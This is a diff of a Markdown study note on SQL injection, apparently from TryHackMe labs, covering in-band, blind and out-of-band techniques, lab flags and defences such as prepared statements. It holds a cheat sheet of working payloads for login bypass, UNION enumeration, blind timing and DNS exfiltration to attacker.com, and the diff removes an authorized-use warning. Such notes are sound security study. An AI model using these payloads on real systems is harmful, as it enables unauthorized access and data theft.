@@ -96,8 +96,8 @@ Every MySQL, MariaDB, and PostgreSQL server has a built-in database called **`in
 **Simple example:** A college database containing students, courses, and marks would typically use a relational database because the data has clear relationships. A social-media application storing varied user posts, comments, and profiles might use a non-relational database because the data structure can vary.
 
 ### Tables, columns, and rows
-- A **table** is a grid — columns run left to right, rows run top to bottom.
-- Each **column (field)** has a name and data type (integer, string, date, etc.); a column can be set to **auto-increment**, creating a **key field** — a guaranteed-unique value per row, used to pinpoint exact rows.
+- A **table** is a grid: columns run left to right, rows run top to bottom.
+- Each **column (field)** has a name and data type (integer, string, date, etc.); a column can be set to **auto-increment**, creating a **key field** with a guaranteed unique value per row, used to pinpoint exact rows.
 - Each **row (record)** is one entry; adding data creates a row, deleting data removes one.
 
 ```mermaid
@@ -119,8 +119,6 @@ graph TD
 - Acronym for the software that controls a database? **DBMS**
 - Name of the grid-like structure that holds the data? **table**
 
----
-
 ## What is SQL Injection?
 
 **Definition**: SQL injection is a web security vulnerability where an attacker inserts malicious SQL commands into input fields such as the search bar or login box to trick the application into running unintended database queries.
@@ -138,7 +136,7 @@ graph TD
     C --> D[4. App responds optional<br/>Result sent back to the user based on what the database did]
 ```
 
-The vulnerability lives specifically at step 2 — the moment raw user input becomes part of the actual SQL command, rather than being treated purely as data.
+The vulnerability lives specifically at step 2. The moment raw user input becomes part of the actual SQL command, rather than being treated purely as data.
 
 ### Example SQL injection queries
 | Injected input | Effect |
@@ -162,8 +160,8 @@ SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
 
 | Type | Definition | How feedback is received |
 |---|---|---|
-| **In-Band** | Results of the injection are returned directly in the application's response — the same channel used to attack is used to read results | Direct and immediate |
-| **Blind** | The application shows no query results or error messages; success must be inferred from indirect signals | Indirect — behavior change, true/false, or response timing |
+| **In-Band** | Results of the injection are returned directly in the application's response (webpage). The same channel used to attack is used to read results | Direct and immediate |
+| **Blind** | The application shows no query results or error messages; success must be inferred from indirect signals | Indirect: behavior change, true/false, or response timing |
 | **Out-of-Band** | The attacker forces the database server to make an *external* network request (e.g. DNS/HTTP) that carries data out through a completely separate channel | Delivered via a different channel entirely (used when neither of the above works) |
 
 **Subtypes:**
@@ -185,11 +183,11 @@ graph TD
 ```
 
 ### Detecting SQL Injection
-Test every input that touches the database — URL parameters, form fields, cookies, HTTP headers:
-- Inject a single quote `'` — a raw database error suggests unsanitized input.
-- Try `"` — some queries use double quotes instead.
-- Inject `;--` — if behavior changes, comment syntax is being processed.
-- Test `OR 1=1` — if results change, the input sits directly in the query's logic.
+Test every input that touches the database: URL parameters, form fields, cookies, HTTP headers:
+- Inject a single quote `'`: a raw database error suggests unsanitized input.
+- Try `"`: some queries use double quotes instead.
+- Inject `;--`: If behavior changes, comment syntax is being processed.
+- Test `OR 1=1`: If results change, the input sits directly in the query's logic.
 
 If errors are suppressed, fall back to Boolean-based (behavioral difference) or Time-based (response delay) detection.
 
@@ -197,24 +195,22 @@ If errors are suppressed, fall back to Boolean-based (behavioral difference) or 
 - What character is commonly used as a first test when probing for SQLi? **`'`**
 - What type of SQLi returns results directly in the web page? **In-Band**
 
----
-
 ## In-Band SQL Injection
 
-The same channel delivers the attack *and* returns the results — making this the easiest category to detect and exploit.
+The same channel delivers the attack and returns the results, making this the easiest category to detect and exploit.
 
 ### Error-Based
-Exploits raw database error messages shown to the user. A misconfigured application leaking errors like *"You have an error in your SQL syntax... near ''1''..."* reveals the database engine, query structure, and quoting style — all useful for crafting more precise payloads.
+Exploits raw database error messages shown to the user. A misconfigured application leaking errors like *"You have an error in your SQL syntax... near ''1''..."* reveals the database engine, query structure, and quoting style, all useful for crafting more precise payloads.
 
 ### Union-Based
 Uses `UNION` to append an attacker-controlled `SELECT` onto the legitimate query, pulling data from any table the database user can access. The general methodology:
 
-1. **Determine column count** — increment `UNION SELECT 1`, `1,2`, `1,2,3`... until the error disappears.
-2. **Identify which columns render on the page** — set the original query's ID to `0` (or another value producing no real result) so only the injected `UNION` row displays; note which column position(s) actually show up in the visible content.
-3. **Extract the database name** — replace a visible column with `database()`.
-4. **Enumerate tables** — query `information_schema.tables WHERE table_schema = '<db_name>'`, using `group_concat()` to fit multiple results into one column.
-5. **Enumerate columns** — query `information_schema.columns WHERE table_name = '<target_table>'`.
-6. **Extract data** — `group_concat(username,':',password SEPARATOR '<br>') FROM <target_table>`.
+1. **Determine column count**: increment `UNION SELECT 1`, `1,2`, `1,2,3`... until the error disappears.
+2. **Identify which columns render on the page**: set the original query's ID to `0` (or another value producing no real result) so only the injected `UNION` row displays; note which column position(s) actually show up in the visible content.
+3. **Extract the database name**: replace a visible column with `database()`.
+4. **Enumerate tables**: query `information_schema.tables WHERE table_schema = '<db_name>'`, using `group_concat()` to fit multiple results into one column.
+5. **Enumerate columns**: query `information_schema.columns WHERE table_name = '<target_table>'`.
+6. **Extract data**: `group_concat(username,':',password SEPARATOR '<br>') FROM <target_table>`.
 
 *Why it works this way*: the column count must match because that's literally how `UNION` is defined by SQL. `0`/`-1` forces the real query to return nothing so the injected data is what actually renders. `information_schema` works because it's the database's own self-documentation, accessible to any user with query access.
 
@@ -222,13 +218,17 @@ Uses `UNION` to append an attacker-controlled `SELECT` onto the legitimate query
 - Subtype of In-Band SQLi that relies on error messages? **Error-based**
 - SQL function that returns the current database name in MySQL? **`database()`**
 
----
 
 ## Blind SQL Injection: Authentication Bypass
 
-**Blind SQLi** occurs when the application shows no query results or error messages — the injection still executes, but success has to be inferred from application *behavior* instead.
+**Blind SQLi** occurs when the application shows no query results or error messages; the injection still executes, but success has to be inferred from application *behavior* instead.
 
-**Authentication bypass** is the most intuitive form: the goal isn't extracting data, just making a login query evaluate to *true*. A typical login query:
+### **Authentication bypass**
+
+Authentication bypass is the most intuitive form: the goal isn't extracting data, just making a login query evaluate to *true*. 
+
+A typical login query:
+
 ```sql
 SELECT * FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;
 ```
@@ -243,19 +243,19 @@ SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1
 
 **Targeting a specific account**: injecting `admin'--` as the username (with the password check commented out entirely) logs in as `admin` specifically, without ever needing the real password.
 
-**Variations to try**: `' OR 1=1;--` (single-quote fields), `' OR 1=1#` (MySQL `#` comment), `" OR 1=1--` (double-quote fields) — and test both username *and* password fields, since only one may actually be concatenated into the query.
+**Variations to try**: `' OR 1=1;--` (single-quote fields), `' OR 1=1#` (MySQL `#` comment), `" OR 1=1--` (double-quote fields), and test both username *and* password fields, since only one may actually be concatenated into the query.
 
 **Q&A**
 - Boolean condition commonly injected to make a WHERE clause always true? **`1=1`**
 
----
+### Boolean-Based & Time-Based
 
-## Blind SQL Injection: Boolean-Based & Time-Based
-
-Both extract actual data (not just a login bypass) when the application gives no visible query output — by asking the database yes/no questions, one character at a time.
+Both extract actual data (not just a login bypass) when the application gives no visible query output by asking the database yes/no questions, one character at a time.
 
 ### Boolean-Based
-Relies on a two-state signal the app already gives you — different page content, a JSON flag like `{"taken":true/false}`, etc. Example: confirming injection with a wildcard that's always true —
+Relies on a two-state signal the app already gives you, different page content, a JSON flag like `{"taken":true/false}`, etc. 
+
+Example: confirming injection with a wildcard that's always true
 ```sql
 admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
 ```
@@ -265,14 +265,16 @@ then narrowing character by character:
 ... LIKE 's%';--   → true   (first letter confirmed: s)
 ... LIKE 'sq%';--  → true   (second letter: q)
 ```
-...continuing until the full database name, then table names (via `information_schema.tables`), column names (via `information_schema.columns`), and finally actual data values are all recovered — purely from watching a true/false flip.
+...continuing until the full database name, then table names (via `information_schema.tables`), column names (via `information_schema.columns`), and finally actual data values are all recovered purely from watching a true/false flip.
 
 ### Time-Based
-Used when there's *no* visible signal at all — not even a true/false difference. MySQL's `SLEEP(x)` function only executes if the injected condition is true, so a delayed response = true, an immediate response = false:
+Used when there's *no* visible signal at all, not even a true/false difference. MySQL's `SLEEP(x)` function only executes if the injected condition is true, so a delayed response = true, an immediate response = false:
 ```sql
 admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
 ```
-The same character-by-character enumeration process as Boolean-based applies — just measured in seconds instead of read from the page. (⚠️ Network latency can produce false positives — use longer sleep values like 5–10s and re-test characters to confirm. MSSQL's equivalent is `WAITFOR DELAY '0:0:5'`.)
+The same character-by-character enumeration process as Boolean-based applies, just measured in seconds instead of read from the page.
+
+(⚠️ Network latency can produce false positives. Use longer sleep values like 5–10s and re-test characters to confirm. MSSQL's equivalent is `WAITFOR DELAY '0:0:5'`.)
 
 ### When to use which
 
@@ -285,11 +287,10 @@ The same character-by-character enumeration process as Boolean-based applies —
 **Q&A**
 - MySQL function that causes a deliberate time delay in a query's response? **`SLEEP()`**
 
----
 
 ## Out-of-Band SQL Injection
 
-**Out-of-Band (OOB)** SQLi is used as a last resort — when In-Band gives no visible output, Boolean-based gives no behavioral difference, and Time-based is too unreliable or blocked. It requires **two separate channels**: one to deliver the attack, and a completely different one (usually DNS or HTTP) to receive the exfiltrated results. Critically, it only works if **the database server itself has outbound network access** — if a firewall blocks all outbound traffic from the DB server, OOB isn't viable.
+**Out-of-Band (OOB)** SQLi is used as a last resort. When In-Band gives no visible output, Boolean-based gives no behavioral difference, and Time-based is too unreliable or blocked. It requires **two separate channels**: one to deliver the attack, and a completely different one (usually DNS or HTTP) to receive the exfiltrated results. Critically, it only works if **the database server itself has outbound network access**. If a firewall blocks all outbound traffic from the DB server, OOB isn't viable.
 
 <img width="371" height="357" alt="image" src="https://github.com/user-attachments/assets/4f1fedcd-2dfb-45d4-a21f-04e429fa9fe1" />
 
@@ -309,33 +310,32 @@ SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
 This builds a UNC path like `\\webapp_db.attacker.com\share`; on Windows-based MySQL servers, `LOAD_FILE()` attempting to resolve that path triggers a DNS lookup for `webapp_db.attacker.com` — which an attacker-controlled DNS server logs, capturing the database name in the subdomain itself.
 
 ### MSSQL techniques
-- **`xp_dirtree`** triggers a DNS lookup by trying to list a remote directory: `EXEC master..xp_dirtree '\\attacker.com\share';` — enabled by default, commonly usable.
+- **`xp_dirtree`** triggers a DNS lookup by trying to list a remote directory: `EXEC master..xp_dirtree '\\attacker.com\share';` : enabled by default, commonly usable.
 - **`xp_cmdshell`** (if enabled) runs OS commands directly, e.g. triggering `nslookup` or `curl` to ship data out — disabled by default in modern MSSQL.
 
 ### Receiving the data
 Something has to be listening for the callback:
-- **Burp Collaborator** — gives a unique subdomain, logs DNS/HTTP requests to it.
-- **Interactsh** (ProjectDiscovery) — free, self-hostable equivalent.
-- **A custom listener** — e.g. a Python DNS server, for full control.
+- **Burp Collaborator**: gives a unique subdomain, logs DNS/HTTP requests to it.
+- **Interactsh** (ProjectDiscovery): free, self-hostable equivalent.
+- **A custom listener**: e.g. a Python DNS server, for full control.
 
 ### Limitations
 - Requires the database server to have outbound network access (often restricted in production).
 - Payloads are engine-specific (MySQL/MSSQL/PostgreSQL each differ).
-- DNS subdomain labels are capped at 63 characters — limits how much data one lookup can carry.
+- DNS subdomain labels are capped at 63 characters which limits how much data one lookup can carry.
 - Generally slower and less reliable than direct extraction.
 
 **Q&A**
 - Protocol beginning with D commonly used to exfiltrate data in OOB SQLi? **DNS**
 - MSSQL stored procedure that can trigger DNS lookups for exfiltration? **`xp_dirtree`**
 
----
 
 ## Remediation and Prevention
 
 Roughly ordered from strongest to weakest/supplementary:
 
-### Prepared Statements (Parameterized Queries) — *the primary defense*
-**Definition**: a technique where the SQL query's structure is written and compiled first, with user input passed in *separately* as bound parameters rather than concatenated into the query string. Because the query structure is fixed before any user input arrives, the database always distinguishes code from data — user input can never be reinterpreted as SQL syntax, no matter what characters it contains.
+### Prepared Statements (Parameterized Queries): *the primary defense*
+**Definition**: a technique where the **SQL query's structure is written and compiled first, with user input passed in *separately* as bound parameters rather than concatenated into the query string**. Because the query structure is fixed before any user input arrives, **the database always distinguishes code from data. User input can never be reinterpreted as SQL syntax, no matter what characters it contains.**
 
 Vulnerable (PHP):
 ```php
@@ -350,16 +350,16 @@ Fixed (Python):
 ```python
 cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
 ```
-The placeholder (`?` or `%s`) is filled in by the database driver as a literal value — even a malicious string like `' OR 1=1--` is treated as one plain string, never as part of the query's logic.
+The database driver fills in the placeholder (`?` or `%s`) as a literal value, even a malicious string like `' OR 1=1--` is treated as one plain string, never as part of the query's logic.
 
 ### Input Validation
-**Definition**: checking and restricting user input against an expected format *before* it ever reaches the database — ideally via **allow-listing** (defining exactly what's valid and rejecting everything else) rather than **block-listing** (trying to filter out "bad" characters, which attackers reliably bypass through encoding tricks or unexpected syntax). Example: if a parameter should be a numeric ID, reject anything that isn't purely digits before it's used. Input validation is a useful supplement, never a substitute for prepared statements.
+**Definition**: **checking and restricting user input against an expected format *before* it ever reaches the database**. Ideally via **allow-listing** (defining exactly what's valid and rejecting everything else) rather than **block-listing** (trying to filter out "bad" characters, which attackers reliably bypass through encoding tricks or unexpected syntax). Example: if a parameter should be a numeric ID, reject anything that isn't purely digits before it's used. Input validation is a useful supplement, never a substitute for prepared statements.
 
 ### Escaping User Input
-**Definition**: prefixing SQL's special characters (`' " $ \`) with a backslash so the database engine treats them as literal text rather than syntax — e.g. `'` becomes `\'`. This is an older, weaker, database-engine-specific technique (different engines escape differently), best treated as a last resort for legacy code that can't easily be refactored to use prepared statements.
+**Definition**: prefixing SQL's special characters (`' " $ \`) with a backslash so the database engine treats them as literal text rather than syntax: e.g., `'` becomes `\'`. This is an older, weaker, database-engine-specific technique (different engines escape differently), best treated as a last resort for legacy code that can't easily be refactored to use prepared statements.
 
 ### Principle of Least Privilege
-**Definition**: a broader security principle stating that any account or process — including the database account a web application connects with — should be granted only the minimum permissions it actually needs. A read-only application's DB account should have `SELECT` only; applications should never connect as `root`/`sa`; sensitive tables should only be reachable by the specific processes that need them. This doesn't prevent SQLi, but it limits the damage if an injection does succeed — an attacker stuck with a low-privilege account can't drop tables or reach other databases.
+**Definition**: a broader security principle stating that any account or process, including the database account a web application connects with, should be granted only the minimum permissions it actually needs. A read-only application's DB account should have `SELECT` only; applications should never connect as `root`/`sa`; sensitive tables should only be reachable by the specific processes that need them. This doesn't prevent SQLi, but it limits the damage if an injection does succeed — an attacker stuck with a low-privilege account can't drop tables or reach other databases.
 
 ### Web Application Firewalls (WAFs)
 **Definition**: a security layer that inspects incoming HTTP requests and blocks known malicious patterns (`' OR 1=1`, `UNION SELECT`, `information_schema`, etc.) before they reach the application. Useful as an additional layer, but not a substitute for secure code — experienced attackers routinely bypass WAFs using encoding tricks, alternate syntax, or obfuscation.
@@ -367,11 +367,10 @@ The placeholder (`?` or `%s`) is filled in by the database driver as a literal v
 **Q&A**
 - Name a method of protecting against SQLi: **Prepared statements**
 
----
 
 ## Practical Labs
 
-Both rooms' hands-on lab work (Union-Based, Authentication Bypass, Boolean-Based, and Time-Based levels, with screenshots and full payload walkthroughs) is documented separately in **[SQL-Injection-Practical.md](./SQL-Injection-Practical.md)**.
+Both rooms' hands-on lab work (Union-Based, Authentication Bypass, Boolean-Based, and Time-Based levels, with screenshots and full payload walkthroughs) is documented separately in **[SQL-Injection-Practical.md](https://github.com/angeline-infosec/notes/blob/main/Web/SQL-Injection-Practical.md)**.
 
 **Flags for reference:**
 
@@ -382,9 +381,8 @@ Both rooms' hands-on lab work (Union-Based, Authentication Bypass, Boolean-Based
 | 3 | Boolean-Based (Blind) | `THM{SQL_INJECTION_1093}` |
 | 4 | Time-Based (Blind) | `THM{SQL_INJECTION_MASTER}` |
 
----
 
-## Cheat Sheet — Common SQLi Payloads
+## Cheat Sheet: Common SQLi Payloads
 
 | Purpose | Payload | Notes |
 |---|---|---|
@@ -403,12 +401,10 @@ Both rooms' hands-on lab work (Union-Based, Authentication Bypass, Boolean-Based
 | DNS exfiltration (MySQL, Windows) | `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\share'));` | Requires outbound DB server access |
 | DNS exfiltration (MSSQL) | `EXEC master..xp_dirtree '\\attacker.com\share';` | |
 
-⚠️ For lab/authorized testing environments only.
 
----
 
 ## Key Takeaways
-- SQLi happens when unvalidated user input becomes part of an executed SQL command instead of staying pure data.
+- **SQLi happens when unvalidated user input becomes part of an executed SQL command instead of staying pure data.**
 - Three types: **In-Band** (results visible directly), **Blind** (yes/no or timing only), **Out-of-Band** (results exfiltrated via a separate channel like DNS).
 - `UNION`'s matching-column-count requirement is the reason column-count probing (`1`, `1,2`, `1,2,3`...) is always step one.
 - `information_schema` turns a confirmed injection point into full knowledge of a database's structure.
